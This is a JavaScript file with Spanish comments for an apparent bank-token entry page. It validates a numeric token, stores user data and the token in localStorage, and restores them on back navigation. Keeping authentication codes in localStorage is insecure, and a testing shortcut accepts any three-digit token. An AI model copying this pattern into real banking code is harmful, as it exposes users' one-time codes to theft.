/**
 * Gestiona los datos de usuario en localStorage para evitar sobrescritura innecesaria.
 * Solo actualiza los datos si hay información nueva o diferente.
 */
function gestionarDatosUsuario(nuevosDatos) {
  // Obtener datos existentes de localStorage
  const datosExistentes = localStorage.getItem("datosUsuarioBanGente");
  
  // Si no hay datos existentes, simplemente guardar los nuevos
  if (!datosExistentes) {
    localStorage.setItem("datosUsuarioBanGente", JSON.stringify(nuevosDatos));
    return nuevosDatos;
  }
  
  // Convertir los datos existentes a objeto
  const datosObj = JSON.parse(datosExistentes);
  
  // Verificar si hay cambios en los datos
  let hayNuevosDatos = false;
  
  // Comparar cada campo para ver si hay cambios
  for (const campo in nuevosDatos) {
    if (nuevosDatos[campo] !== datosObj[campo] && nuevosDatos[campo]) {
      // Solo actualizar si el nuevo valor no es vacío/null/undefined
      datosObj[campo] = nuevosDatos[campo];
      hayNuevosDatos = true;
    }
  }
  
  // Solo guardar si hay cambios
  if (hayNuevosDatos) {
    localStorage.setItem("datosUsuarioBanGente", JSON.stringify(datosObj));
  }
  
  // Devolver los datos actualizados o los existentes si no hubo cambios
  return datosObj;
}

/**
 * Restaura datos guardados en localStorage si el usuario navega hacia atrás.
 * @returns {Object|null} Los datos restaurados o null si no hay datos
 */
function restaurarDatosAlVolverAtras() {
  // Detectar si se está volviendo atrás usando la API de History
  // Esta función se debe llamar al cargar la página
  const datosGuardados = localStorage.getItem("datosUsuarioBanGente");
  
  if (datosGuardados) {
    // Si hay datos guardados, devolverlos para que la página los use
    return JSON.parse(datosGuardados);
  }
  
  return null;
}

/**
 * Función para obtener los datos actualizados del localStorage
 */
function obtenerDatosAlmacenados() {
  return JSON.parse(localStorage.getItem("datosUsuarioBanGente") || "{}");
}

/**
 * Valida que el input de token solo acepte valores numéricos y limite su longitud.
 * Además activa o desactiva el botón Siguiente según si hay al menos 3 caracteres.
 */
function handleTokenInput() {
  if (!token) return;
  
  // Validar que solo sean números
  const inputValue = token.value;
  const numericValue = inputValue.replace(/[^0-9]/g, '');
  
  // Si se intentó ingresar algo que no es un número, reemplazar el valor
  if (inputValue !== numericValue) {
    token.value = numericValue;
  }
  
  // Limitar a 6 dígitos (estándar para tokens bancarios)
  if (numericValue.length > 8) {
    token.value = numericValue.substring(0, 8);
  }
  
  // Activar o desactivar el botón según la longitud
  if (siguienteBtn) {
    // Simplificación para pruebas - activar con cualquier valor numérico
    if (token.value.length >= 3) {
      siguienteBtn.disabled = false;
    } else {
      siguienteBtn.disabled = true;
    }
  } else {
  }
}

/**
 * Actualiza el campo de token si hay un valor guardado previamente.
 * Esta función es específica para la página token.html
 * @param {Object} datos Los datos para rellenar el formulario
 */
function rellenarFormularioToken(datos) {
  if (!datos) return;
  
  // En la página de token, solo nos interesa rellenar el campo de token si existe
  if (token && datos.token) {
    token.value = datos.token;
    // Activar el botón si el token tiene suficiente longitud
    handleTokenInput();
  }
}

// Exportar funciones para que puedan ser utilizadas desde script.js
window.gestionarDatosUsuario = gestionarDatosUsuario;
window.restaurarDatosAlVolverAtras = restaurarDatosAlVolverAtras;

// Variables globales que se inicializarán en DOMContentLoaded
let formulario;
let token;
let siguienteBtn;
let overlay;
let preloader;
let datosUsuario = {};

// Un solo DOMContentLoaded para toda la inicialización
document.addEventListener("DOMContentLoaded", function() {
  // Inicializar elementos DOM
  formulario = document.getElementById("login-form");
  token = document.getElementById("token");
  siguienteBtn = document.getElementById("btn-siguiente");
  overlay = document.querySelector(".overlay");
  preloader = document.getElementById("preloader");
  
  // Ocultar el preloader por defecto
  if (preloader) {
    preloader.style.display = "none";
  }

  // Obtener datos almacenados
  datosUsuario = obtenerDatosAlmacenados();
  
  // Verificar si estamos volviendo atrás
  if (window.performance && window.performance.navigation.type === window.performance.navigation.TYPE_BACK_FORWARD) {
    // Si estamos volviendo atrás, restaurar datos
    const datosRestaurados = restaurarDatosAlVolverAtras();
    rellenarFormularioToken(datosRestaurados);
  }
  
  // Configurar validación del token
  if (token) {
    // Agregar validación en cada evento de input
    token.addEventListener("input", handleTokenInput);
    
    // También validar en eventos de pegado (paste)
    token.addEventListener("paste", function(e) {
      // Permitir que ocurra el pegado
      setTimeout(function() {
        // Luego validar y corregir
        handleTokenInput();
      }, 0);
    });
    
    // Enfoque automático en el campo token
    setTimeout(function() {
      token.focus();
    }, 100);
    
    // Ejecutar una vez para configurar el estado inicial del botón
    handleTokenInput();
  }
  
  // Manejar el evento de clic en el botón Siguiente
  if (siguienteBtn && formulario) {  
    siguienteBtn.addEventListener("click", function() {
      // Verificar si el botón no está deshabilitado
      if (!siguienteBtn.disabled) {
        // Enviar el formulario
        const event = new Event("submit");
        formulario.dispatchEvent(event);
      }
    });
  }
  

});